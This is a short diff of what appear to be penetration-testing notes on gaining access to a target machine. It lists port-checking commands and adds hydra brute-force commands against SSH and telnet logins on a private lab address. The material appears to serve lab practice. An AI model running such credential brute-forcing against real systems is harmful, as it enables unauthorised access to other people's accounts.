@@ -48,5 +48,7 @@ Here you can see tools and ideas for getting access to the target machine, scann
 
 9. checking open ports; sudo ss -tulwnp (for linux), netstat -ano | findstr /i ":80" (for Wondows)
 
-10. hydra -L users.txt -P passwords.txt ssh://192.168.56.101 -t 4 -f -V -o hydra_found.txt
+10. hydra -L users.txt -P passwords.txt ssh://192.168.56.101 -t 4 -f -V -o hydra_found.txt  SSH
+    hydra -l testuser -P passwords.txt telnet://192.168.56.101 -t 2 -V -o found.txt TELNET
+
    We need to use hydra for getting login and password for telnet
